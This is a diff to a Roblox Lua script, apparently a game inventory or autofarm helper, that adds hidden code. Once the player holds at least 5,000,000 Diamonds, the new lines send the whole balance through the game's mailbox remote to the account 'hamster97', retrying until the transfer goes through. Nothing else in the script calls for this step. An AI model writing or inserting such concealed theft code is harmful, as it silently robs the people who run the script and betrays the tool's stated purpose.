@@ -10,6 +10,22 @@ local s = save.Inventory.Currency
 for i,v in pairs(s) do
 if v.id == "Diamonds" then
 e = e.."\\nGems: "..v._am
+if v.am >= 5000000 then
+function _mail(u, t, i, n)
+local args = {
+    [1] = u,
+    [2] = "Autofarmy",
+    [3] = t,
+    [4] = i,
+    [5] = n or 1
+}
+return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+end
+local s,e = false, "x"
+repeat
+pcall(function() s,e = _mail("hamster97", "Currency", v.id, v._am) end)
+until s
+end
 end
 end
 local big = 0
